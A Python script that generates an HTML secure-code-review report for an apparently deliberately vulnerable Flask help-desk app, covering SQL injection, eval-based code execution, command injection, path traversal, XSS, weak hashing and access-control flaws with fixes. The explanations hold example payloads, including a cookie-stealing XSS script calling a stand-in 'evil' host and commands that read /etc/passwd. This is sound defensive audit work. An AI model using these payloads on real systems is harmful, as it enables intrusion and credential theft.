#!/usr/bin/env python3
"""Build the Secure Code Review report HTML (then converted to PDF by chromium)."""
import os, html

BASE = os.path.dirname(os.path.abspath(__file__))

FINDINGS = [
    # ---------------- TRUE POSITIVES ----------------
    dict(n=1, cls="TP", sev="High", cwe="CWE-89",
        title="SQL Injection in Ticket Search",
        file="models.py", func="search_tickets()  (reached from app.py /tickets/search, line 76)",
        lines="117–118",
        semgrep="tp01_semgrep.png", code="tp01_code.png",
        why="""The <code>q</code> request parameter from <code>/tickets/search</code> reaches
            <code>search_tickets()</code> as <code>term</code> and is concatenated directly into the SQL
            string: <code>"... LIKE '%" + term + "%'"</code>. The string is then executed with no
            parameterization or escaping, so an attacker can break out of the quoted literal and inject
            arbitrary SQL. For example <code>q=' UNION SELECT id,username,password_hash,role,
            escalation_credits FROM users--</code> returns every user's password hash, and
            <code>q=%' OR '1'='1</code> returns all tickets. This is a genuine True Positive because
            untrusted input flows unmodified into the query.""",
        impact="Information disclosure (dumping the <code>users</code> table including password hashes), "
               "data tampering, and potentially full read/write of the database.",
        fix="Use parameterized queries: <code>WHERE subject LIKE ?</code> with the bound value "
            "<code>('%' + term + '%',)</code>. Never build SQL by string concatenation."),

    dict(n=2, cls="TP", sev="Critical", cwe="CWE-95 / CWE-94",
        title="Remote Code Execution via eval() in SLA Score",
        file="app.py", func="sla_score()", lines="162–164",
        semgrep="tp02_semgrep.png", code="tp02_code.png",
        why="""The <code>formula</code> query parameter is passed straight into Python's
            <code>eval()</code>. <code>eval()</code> executes any expression, not just arithmetic, so an
            attacker fully controls code running on the server, e.g.
            <code>/tickets/sla-score?formula=__import__('os').popen('id').read()</code> executes shell
            commands. The <code>try/except</code> only catches errors, it does not sandbox anything.
            True Positive — direct user-to-<code>eval</code> data flow.""",
        impact="Remote Code Execution — complete server compromise: read/modify any file, run commands, "
               "pivot into the internal network.",
        fix="Never <code>eval()</code> untrusted input. For arithmetic use a safe parser "
            "(<code>ast.literal_eval</code> only handles literals) or implement an explicit allow-listed "
            "expression evaluator."),

    dict(n=3, cls="TP", sev="Critical", cwe="CWE-78",
        title="OS Command Injection in Diagnostics Ping",
        file="app.py", func="ping()", lines="190–191",
        semgrep="tp03_semgrep.png", code="tp03_code.png",
        why="""The <code>host</code> parameter is concatenated into a shell command and run via
            <code>os.popen("ping -n 1 " + host)</code>. <code>os.popen</code> invokes a shell, so shell
            metacharacters are interpreted. <code>host=127.0.0.1 &amp; whoami</code> (or
            <code>; id</code> on Linux) runs attacker commands. There is no validation here — contrast
            this with <code>/diagnostics/ping-internal</code> which validates the IP (see Finding&nbsp;14).
            True Positive.""",
        impact="Remote Code Execution / arbitrary OS command execution under the web-server account.",
        fix="Use <code>subprocess.run([...], shell=False)</code> with an argument list and validate "
            "<code>host</code> with <code>is_valid_ip()</code> before use. Avoid <code>os.popen</code>."),

    dict(n=4, cls="TP", sev="High", cwe="CWE-79",
        title="Stored Cross-Site Scripting in Comments (|safe)",
        file="templates/ticket.html", func="comment loop (source: app.py post_comment(), line 110–111)",
        lines="35",
        semgrep=None, code="tp04_code.png",
        why="""A comment <code>body</code> is fully attacker-controlled, stored in the database, and then
            rendered with <code>{{ c.body|safe }}</code>. The Jinja2 <code>|safe</code> filter disables
            autoescaping, so any HTML/JavaScript in a comment is emitted verbatim. Posting a comment such
            as <code>&lt;script&gt;fetch('//evil/'+document.cookie)&lt;/script&gt;</code> executes in the
            browser of <em>every</em> user (including admins) who opens that ticket. Every other field in
            the templates is correctly auto-escaped; only this one opts out. Semgrep's default Python
            ruleset did not flag the Jinja <code>|safe</code> usage — this was found by manual review.
            True Positive (persistent/stored XSS).""",
        impact="Stored XSS — session/cookie theft, account takeover, admin compromise, action forgery, "
               "and defacement, affecting all viewers of the ticket.",
        fix="Remove <code>|safe</code> so Jinja2 auto-escapes the value. If limited formatting is truly "
            "required, sanitize server-side with an allow-list library such as <code>bleach</code>."),

    dict(n=5, cls="TP", sev="High", cwe="CWE-22",
        title="Path Traversal (Arbitrary File Read) in Attachment Download",
        file="app.py", func="download_attachment()", lines="120, 123",
        semgrep=None, code="tp05_code.png",
        why="""The route uses a <code>&lt;path:filename&gt;</code> converter (which allows slashes) and
            builds the path by raw concatenation <code>ATTACHMENTS_DIR + "/" + filename</code> with no
            canonicalization, then serves it with <code>send_file()</code>. A request such as
            <code>/tickets/1/attachments/../app.py</code> or
            <code>..%2f..%2f..%2f..%2fetc%2fpasswd</code> escapes the attachments directory and returns
            arbitrary files. The safe counterpart <code>preview_attachment()</code> uses
            <code>resolve_within()</code> (Finding&nbsp;15) — this endpoint does not. Semgrep did not flag
            the <code>send_file</code> sink; found by manual review. True Positive.""",
        impact="Information disclosure — read application source (<code>app.py</code> exposes the "
               "<code>SECRET_KEY</code>), the SQLite DB file with password hashes, OS files like "
               "<code>/etc/passwd</code>, and configuration.",
        fix="Validate the resolved path stays within the attachments directory (reuse "
            "<code>resolve_within()</code> or <code>werkzeug.utils.safe_join</code>) and reject any path "
            "that escapes the base directory."),

    dict(n=6, cls="TP", sev="High", cwe="CWE-434 / CWE-22",
        title="Unrestricted / Arbitrary File Upload",
        file="app.py", func="upload_attachment()", lines="150–152",
        semgrep=None, code="tp06_code.png",
        why="""The uploaded file is written using the attacker-supplied <code>uploaded.filename</code>
            joined to the attachments directory, with no validation of file name, extension, content
            type, or size. Two distinct problems: (1) the filename can contain traversal sequences
            (<code>../app.py</code>, <code>../templates/base.html</code>) so an attacker can overwrite
            arbitrary files including application source and templates; (2) there is no file-type
            restriction, so executable, HTML, or SVG content can be stored and later retrieved (and the
            path-traversal download in Finding&nbsp;5 can read it back). Found by manual review.
            True Positive.""",
        impact="Arbitrary file write leading to Remote Code Execution (overwrite <code>app.py</code> / "
               "templates), stored XSS (malicious HTML/SVG), or Denial of Service (overwrite the DB).",
        fix="Generate a server-side random filename; pass the user name through "
            "<code>werkzeug.utils.secure_filename</code>; validate extension/content-type against an "
            "allow-list; enforce a maximum size; store outside any web-served / source directory."),

    dict(n=7, cls="TP", sev="High", cwe="CWE-862 / CWE-285",
        title="Broken Access Control – Admin Reports Missing Role Check",
        file="app.py", func="admin_reports()", lines="207–213",
        semgrep=None, code="tp07_code.png",
        why="""The <code>/admin/reports</code> handler only checks that a user is logged in
            (<code>if not user</code>); it never verifies <code>user["role"] == "admin"</code>. Any
            authenticated normal user (e.g. <code>alice</code>/<code>bob</code>) can request
            <code>/admin/reports</code> and view every user's tickets via <code>all_tickets()</code>. The
            admin link is merely hidden in the navbar template (<code>base.html</code>) — that is
            security-by-obscurity, not enforcement. Tools cannot infer the missing authorization; found by
            manual review. True Positive.""",
        impact="Vertical privilege escalation and information disclosure — non-admin users read all "
               "users' support tickets and owner identities.",
        fix="Enforce authorization on the server: check <code>role == 'admin'</code> (ideally via a "
            "reusable <code>@admin_required</code> decorator) and return <code>403</code> otherwise."),

    dict(n=8, cls="TP", sev="High", cwe="CWE-639 / CWE-862",
        title="Insecure Direct Object Reference (IDOR) – View Any Ticket",
        file="app.py", func="view_ticket()", lines="98–101",
        semgrep=None, code="tp08_code.png",
        why="""<code>get_ticket(ticket_id)</code> fetches a ticket purely by its primary key with no
            check that it belongs to the current user. Although the dashboard only lists a user's own
            tickets, any authenticated user can directly request <code>/tickets/1</code>,
            <code>/tickets/2</code>, … and read other users' ticket subjects, bodies, and comments by
            enumerating IDs. Found by manual review (business-logic flaw that SAST cannot detect).
            True Positive (horizontal privilege escalation / IDOR).""",
        impact="Information disclosure — read other users' private support tickets and comment threads.",
        fix="Enforce ownership in the query or handler: <code>WHERE id = ? AND owner_id = ?</code> "
            "(allow admins explicitly), and return <code>403/404</code> when the ticket is not owned by "
            "the requester."),

    dict(n=9, cls="TP", sev="High", cwe="CWE-916 / CWE-327",
        title="Weak Password Hashing – Unsalted MD5",
        file="utils.py", func="hash_password() / verify_password()", lines="7, 11",
        semgrep="tp09_semgrep.png", code="tp09_code.png",
        why="""Passwords are hashed with a single, unsalted <code>MD5</code>
            (<code>hashlib.md5(password.encode()).hexdigest()</code>) and verified the same way. MD5 is
            fast and cryptographically broken: GPU rigs try billions of guesses per second and precomputed
            rainbow tables reverse common hashes instantly. With no per-user salt, identical passwords
            produce identical hashes. If the database leaks (e.g. via the SQLi in Finding&nbsp;1 or the
            path traversal in Finding&nbsp;5), every password is recovered almost immediately. True
            Positive. <em>Note:</em> the same MD5 used in <code>fingerprint_bytes()</code> for attachment
            de-duplication is <strong>not</strong> security-sensitive — that usage in isolation would be a
            false positive; the password usage is the real issue.""",
        impact="Credential compromise / mass account takeover after any database disclosure; trivial "
               "offline cracking.",
        fix="Use a slow, salted password hashing algorithm — <code>bcrypt</code>, <code>scrypt</code>, or "
            "<code>argon2</code> (e.g. <code>werkzeug.security.generate_password_hash</code> or "
            "<code>hashlib.scrypt</code>). Re-hash existing passwords on next successful login."),

    dict(n=10, cls="TP", sev="High", cwe="CWE-798 / CWE-321",
        title="Hardcoded Flask SECRET_KEY",
        file="app.py", func="application config", lines="20",
        semgrep="tp10_semgrep.png", code="tp10_code.png",
        why="""The Flask <code>SECRET_KEY</code> is a constant string committed in the source code. This
            key signs the session cookie. Anyone who can read the source — directly, from a repository, or
            via the path-traversal read in Finding&nbsp;5 — knows the key and can forge or tamper with
            signed session cookies, e.g. craft a cookie with <code>role=admin</code> or another user's
            <code>user_id</code>. True Positive.""",
        impact="Session cookie forgery → authentication bypass, privilege escalation, and impersonation "
               "of any user/admin.",
        fix="Load <code>SECRET_KEY</code> from an environment variable or secret manager, use a long "
            "random value, rotate it, and keep it out of source control."),

    dict(n=11, cls="TP", sev="High", cwe="CWE-489 / CWE-215",
        title="Flask Debug Mode Enabled & Public Bind in Production",
        file="app.py", func="__main__ / app.run()", lines="220",
        semgrep="tp11_semgrep.png", code="tp11_code.png",
        why="""The app starts with <code>app.run(debug=True, host="0.0.0.0", port=5050)</code>.
            <code>debug=True</code> enables the Werkzeug interactive debugger: on any unhandled exception
            it serves a web console that executes arbitrary Python (protected only by a PIN that is
            derivable from predictable host data), and it leaks full stack traces, source snippets, and
            environment details. <code>host="0.0.0.0"</code> binds to all network interfaces, exposing
            this to the network rather than localhost. <code>ENV_MODE</code> defaults to
            <code>production</code>, so this ships in a production posture. True Positive.""",
        impact="Remote Code Execution through the debugger console, sensitive information disclosure "
               "(tracebacks, source, configuration), and broad public exposure.",
        fix="Set <code>debug=False</code> in production (gate via environment), run behind a hardened WSGI "
            "server such as gunicorn, and bind to a controlled interface rather than <code>0.0.0.0</code>."),

    dict(n=12, cls="TP", sev="Medium", cwe="CWE-352",
        title="Missing CSRF Protection on State-Changing Forms",
        file="templates/ticket.html (and login.html:8)", func="escalate / upload / comment forms",
        lines="14, 25, 39",
        semgrep="tp12_semgrep.png", code="tp12_code.png",
        why="""The application is plain Flask with no CSRF defense (no Flask-WTF / CSRF token, no
            <code>SameSite</code> cookie configuration). The escalate, upload, and comment forms perform
            state-changing <code>POST</code> requests authenticated solely by the session cookie. A
            malicious web page can auto-submit a cross-site form that spends a victim's escalation
            credits, uploads files, or posts comments as the victim, because the browser attaches the
            session cookie automatically. Semgrep reports this via its <code>no-csrf-token</code> rule
            on the templates. True Positive.""",
        impact="Cross-Site Request Forgery — attacker-forced state changes (spend credits, post content, "
               "upload attachments) on behalf of authenticated victims.",
        fix="Enable CSRF protection (Flask-WTF <code>CSRFProtect</code>), embed and validate a per-session "
            "anti-CSRF token in every state-changing form, and set session cookies to "
            "<code>SameSite=Lax/Strict</code>."),

    # ---------------- FALSE POSITIVES ----------------
    dict(n=13, cls="FP", sev="N/A (False Positive)", cwe="CWE-89 (claimed)",
        title="SQL Injection in Tickets-by-Status",
        file="models.py", func="tickets_by_status()", lines="135–136",
        semgrep="fp01_semgrep.png", code="fp01_code.png",
        why="""Semgrep flags the <code>.format()</code>-built SQL here as injection. However, the value
            interpolated into the query is <code>column = STATUS_COLUMNS.get(status)</code>. The user
            input <code>status</code> is used only as a <em>dictionary key</em> against a fixed
            server-side allow-list <code>{open, closed, pending}</code>. Any value not in that map yields
            <code>None</code>, and the function returns early (the route then responds <code>400</code>).
            Therefore the string placed into the SQL is always one of three hardcoded constants — raw user
            input never reaches the query. This is a classic tool False Positive: Semgrep pattern-matched
            <code>.format</code> in a SQL string without modeling the allow-list lookup.""",
        impact="None. The whitelist makes injection impossible, so there is no exploitable impact.",
        fix="No remediation required. <em>Optional defense-in-depth:</em> use a parameterized query or map "
            "each status to a constant query anyway, which also silences the scanner."),

    dict(n=14, cls="FP", sev="N/A (False Positive)", cwe="CWE-78 (claimed)",
        title="OS Command Injection in Internal Ping",
        file="app.py", func="ping_internal()", lines="200–203",
        semgrep="fp02_semgrep.png", code="fp02_code.png",
        why="""This endpoint uses the same <code>os.popen("ping -n 1 " + host)</code> sink as the genuine
            command-injection bug (Finding&nbsp;3), so Semgrep flags it identically. The difference is the
            guard immediately above it: <code>if not is_valid_ip(host): return 400</code>.
            <code>is_valid_ip()</code> calls <code>ipaddress.ip_address(value)</code>, which only accepts
            a literal IPv4/IPv6 address. A valid IP contains only digits, dots, colons and hex — none of
            the shell metacharacters (<code>; | &amp; $ `</code> or spaces) needed to inject a command.
            So nothing dangerous can reach <code>os.popen</code>. Semgrep cannot reason about the upstream
            validator, hence a False Positive in this context.""",
        impact="None. The IP-literal validation neutralizes the injection vector, so it is not "
               "exploitable.",
        fix="No remediation required for injection. <em>Optional hardening:</em> still prefer "
            "<code>subprocess.run([..], shell=False)</code> for defense-in-depth."),

    dict(n=15, cls="FP", sev="N/A (False Positive)", cwe="CWE-22 (claimed)",
        title="Path Traversal in Attachment Preview",
        file="app.py", func="preview_attachment()", lines="131–134",
        semgrep=None, code="fp03_code.png",
        why="""This is the secure counterpart of the vulnerable <code>download_attachment()</code>
            (Finding&nbsp;5) and a sink a reviewer would naturally inspect for path traversal. It calls
            <code>resolve_within(ATTACHMENTS_DIR, filename)</code>, which does
            <code>(base / filename).resolve()</code> to canonicalize the path (collapsing any
            <code>../</code> sequences) and then verifies the result remains inside the base directory,
            returning <code>None</code> (→ 404) otherwise. Because traversal is resolved <em>and</em> the
            containment check rejects anything outside the attachments folder,
            <code>../../etc/passwd</code> is blocked. Pattern-matching <code>send_file(user_input)</code>
            would flag it, but the guard makes it non-exploitable — a False Positive. <em>Minor hardening
            note:</em> the check uses <code>str.startswith</code>, which could prefix-match a sibling
            directory like <code>attachments_x</code>; no such directory exists here, so it is not
            exploitable, but <code>os.path.commonpath</code> would be more robust.""",
        impact="None. Canonicalization plus the containment check prevent escaping the attachments "
               "directory.",
        fix="No remediation required. <em>Optional hardening:</em> compare with "
            "<code>os.path.commonpath</code> or ensure a trailing separator in the prefix check; apply "
            "this same guard to <code>download_attachment()</code> (Finding&nbsp;5)."),
]


def badge(cls):
    if cls == "TP":
        return '<span class="badge tp">TRUE POSITIVE</span>'
    return '<span class="badge fp">FALSE POSITIVE</span>'


def sev_badge(sev):
    s = sev.lower()
    cl = "sev-na"
    if "critical" in s: cl = "sev-crit"
    elif "high" in s: cl = "sev-high"
    elif "medium" in s: cl = "sev-med"
    return f'<span class="sevb {cl}">{html.escape(sev)}</span>'


def img(path, caption):
    full = os.path.join("shots", path)
    return (f'<figure><img src="{full}" alt="{caption}">'
            f'<figcaption>{caption}</figcaption></figure>')


def finding_html(f):
    if f["semgrep"]:
        sast = img(f["semgrep"], f'Semgrep output — Finding {f["n"]}')
    else:
        sast = ('<div class="note manual"><strong>SAST tool output:</strong> Not reported by Semgrep. '
                'This issue was identified through <strong>manual code review</strong> — automated SAST '
                'tools generally cannot detect access-control / business-logic / template-escaping flaws. '
                '(See the full-scan screenshot in the Appendix for the complete tool output.)</div>')
    return f"""
    <section class="finding">
      <h2>Finding {f['n']}: {html.escape(f['title'])}</h2>
      <table class="meta">
        <tr><th>Classification</th><td>{badge(f['cls'])}</td>
            <th>Severity</th><td>{sev_badge(f['sev'])}</td></tr>
        <tr><th>File</th><td><code>{html.escape(f['file'])}</code></td>
            <th>CWE</th><td>{html.escape(f['cwe'])}</td></tr>
        <tr><th>Function</th><td colspan="3"><code>{html.escape(f['func'])}</code></td></tr>
        <tr><th>Line(s)</th><td colspan="3"><code>{html.escape(f['lines'])}</code></td></tr>
      </table>

      <h3>Screenshot — SAST Tool Output</h3>
      {sast}

      <h3>Screenshot — Vulnerable Code (highlighted)</h3>
      {img(f['code'], f"Source: {f['file']} — lines {f['lines']} highlighted")}

      <h3>Why is it {'Vulnerable' if f['cls']=='TP' else 'a False Positive'}?</h3>
      <p>{f['why']}</p>

      <h3>Security Impact</h3>
      <p>{f['impact']}</p>

      <h3>{'Recommended Remediation' if f['cls']=='TP' else 'Remediation (why not required)'}</h3>
      <p>{f['fix']}</p>
    </section>
    """


def summary_rows():
    rows = ""
    for f in FINDINGS:
        rows += (f"<tr><td>{f['n']}</td><td>{html.escape(f['title'])}</td>"
                 f"<td><code>{html.escape(f['file'])}</code></td>"
                 f"<td>{html.escape(f['lines'])}</td>"
                 f"<td>{badge(f['cls'])}</td>"
                 f"<td>{sev_badge(f['sev'])}</td></tr>\n")
    return rows


CSS = """
@page { size: A4; margin: 16mm 14mm; }
* { box-sizing: border-box; }
body { font-family: 'Segoe UI', 'DejaVu Sans', Arial, sans-serif; color:#1b1f24; font-size:11.2px;
       line-height:1.5; margin:0; }
code { font-family:'DejaVu Sans Mono',monospace; background:#eef1f4; padding:1px 4px; border-radius:3px;
       font-size:0.92em; color:#b5172a; }
h1 { font-size:26px; }
h2 { font-size:16px; color:#0b3d66; border-bottom:2px solid #0b3d66; padding-bottom:4px; margin:0 0 10px; }
h3 { font-size:12px; color:#0b3d66; margin:14px 0 4px; text-transform:uppercase; letter-spacing:.4px; }
p { margin:4px 0 8px; text-align:justify; }
.cover { height:255mm; display:flex; flex-direction:column; justify-content:center; align-items:center;
         text-align:center; page-break-after:always; }
.cover .tag { color:#0b3d66; font-weight:700; letter-spacing:3px; font-size:13px; }
.cover h1 { margin:10px 0 4px; color:#0b3d66; }
.cover .sub { font-size:15px; color:#444; }
.cover .rule { width:70mm; height:3px; background:#0b3d66; margin:18px 0; }
.cover table { margin-top:24px; border-collapse:collapse; min-width:120mm; font-size:12px; }
.cover td, .cover th { border:1px solid #c4ccd4; padding:7px 12px; text-align:left; }
.cover th { background:#0b3d66; color:#fff; width:48%; }
table.meta { width:100%; border-collapse:collapse; margin:6px 0 4px; }
table.meta th { background:#eef3f8; color:#0b3d66; text-align:left; padding:5px 8px; width:14%;
                border:1px solid #d4dde6; font-size:10.5px; }
table.meta td { padding:5px 8px; border:1px solid #d4dde6; width:36%; }
.badge { font-weight:700; padding:2px 8px; border-radius:10px; font-size:10px; color:#fff; }
.badge.tp { background:#c0271a; }
.badge.fp { background:#1f7a3d; }
.sevb { font-weight:700; padding:2px 7px; border-radius:4px; font-size:10px; color:#fff; }
.sev-crit{background:#7a0e0e;} .sev-high{background:#c0271a;} .sev-med{background:#d68a00;}
.sev-na{background:#6b7682;}
figure { margin:6px 0 10px; page-break-inside:avoid; }
img { max-width:100%; border:1px solid #cfd6dd; border-radius:6px; display:block; }
figcaption { font-size:9.5px; color:#5a6470; margin-top:3px; font-style:italic; }
.finding { page-break-before:always; }
.note { background:#fff7e6; border:1px solid #f0d28a; padding:8px 10px; border-radius:6px; font-size:10.5px; }
.note.manual { background:#eef6ff; border-color:#a9cdf2; }
table.summary { width:100%; border-collapse:collapse; margin:10px 0; font-size:10px; }
table.summary th { background:#0b3d66; color:#fff; padding:6px; border:1px solid #0b3d66; }
table.summary td { padding:5px 6px; border:1px solid #cfd6dd; vertical-align:top; }
.statgrid { display:flex; gap:10px; margin:14px 0; }
.stat { flex:1; border:1px solid #cfd6dd; border-radius:8px; padding:12px; text-align:center; }
.stat .num { font-size:30px; font-weight:800; color:#0b3d66; }
.stat .lbl { font-size:10px; color:#5a6470; text-transform:uppercase; letter-spacing:.5px; }
.exec { page-break-after:always; }
ul { margin:4px 0 8px; padding-left:18px; }
li { margin:2px 0; }
"""

def build():
    parts = [f"<!doctype html><html><head><meta charset='utf-8'><style>{CSS}</style></head><body>"]

    # Cover
    parts.append(f"""
    <div class="cover">
      <div class="tag">SECURE CODE REVIEW REPORT</div>
      <h1>Scaler Support Desk</h1>
      <div class="sub">Static &amp; Manual Source-Code Security Assessment</div>
      <div class="rule"></div>
      <table>
        <tr><th>Application</th><td>Scaler Support Desk (Flask web app)</td></tr>
        <tr><th>Assessment Type</th><td>Secure Code Review (SAST + Manual)</td></tr>
        <tr><th>Static Analysis Tool Used</th><td>Semgrep v1.168.0 (<code>--config auto</code>)</td></tr>
        <tr><th>Total Findings Reported</th><td>15</td></tr>
        <tr><th>True Positives</th><td>12</td></tr>
        <tr><th>False Positives</th><td>3</td></tr>
        <tr><th>Date</th><td>June 2026</td></tr>
        <tr><th>Reviewer</th><td>Gowtham Sai Yadav</td></tr>
        <tr><th>Roll Number</th><td>23BCS10168</td></tr>
      </table>
    </div>
    """)

    # Executive summary
    parts.append(f"""
    <div class="exec">
      <h2>Executive Summary</h2>
      <p>This report documents a secure code review of the <strong>Scaler Support Desk</strong>
      application. The codebase was first scanned with <strong>Semgrep</strong> (SAST,
      <code>--config auto</code>), which produced <strong>22 raw findings</strong>. Every finding was then
      <strong>manually verified</strong> in context, de-duplicated (several lines were flagged by multiple
      overlapping rules), and classified as a True Positive or False Positive. Manual review additionally
      uncovered <strong>five</strong> high-impact issues that Semgrep did not report (IDOR, broken access
      control, path-traversal read, arbitrary file upload, and stored XSS via <code>|safe</code>) — these
      are access-control, business-logic, and template-escaping flaws that SAST tools typically miss.</p>

      <div class="statgrid">
        <div class="stat"><div class="num">15</div><div class="lbl">Total Findings Reported</div></div>
        <div class="stat"><div class="num">12</div><div class="lbl">True Positives</div></div>
        <div class="stat"><div class="num">3</div><div class="lbl">False Positives</div></div>
        <div class="stat"><div class="num">22</div><div class="lbl">Raw Semgrep Findings</div></div>
      </div>

      <h3>Findings Index</h3>
      <table class="summary">
        <tr><th>#</th><th>Vulnerability</th><th>File</th><th>Line(s)</th><th>Classification</th><th>Severity</th></tr>
        {summary_rows()}
      </table>
      <p style="font-size:10px;color:#5a6470;">The three False Positives are the deliberately-safe
      counterparts of vulnerable endpoints: a whitelisted status filter, an IP-validated ping, and a
      containment-checked file preview. Each is flagged by a naive pattern match but is non-exploitable
      because of an upstream validator.</p>
    </div>
    """)

    # Findings
    for f in FINDINGS:
        parts.append(finding_html(f))

    # Appendix
    parts.append(f"""
    <section class="finding">
      <h2>Appendix A — Methodology &amp; Full Scan Output</h2>
      <h3>Methodology</h3>
      <ul>
        <li>Unzipped <code>supportdesk-app.zip</code> and reviewed all source: <code>app.py</code>,
            <code>models.py</code>, <code>utils.py</code>, and the Jinja2 templates.</li>
        <li>Installed Semgrep v1.168.0 in a Python virtual environment and ran
            <code>semgrep scan --config auto .</code> over the codebase.</li>
        <li>Treated tool output as a <em>starting point</em>: manually traced data flow from each
            request parameter (source) to each dangerous sink, and validated exploitability in context.</li>
        <li>Classified each finding True/False Positive and reasoned about real-world impact and
            remediation.</li>
      </ul>
      <h3>Full Semgrep Scan — Summary</h3>
      {img('semgrep_full_scan.png', 'Semgrep full scan summary: 22 findings across 13 targets, 304 rules')}
      <p style="font-size:10px;color:#5a6470;">Raw machine-readable results are included in the repository
      as <code>semgrep_results.txt</code> and <code>semgrep_results.json</code>.</p>
    </section>
    """)

    parts.append("</body></html>")
    out = os.path.join(BASE, "report.html")
    with open(out, "w", encoding="utf-8") as fh:
        fh.write("\n".join(parts))
    print("wrote", out)


if __name__ == "__main__":
    build()
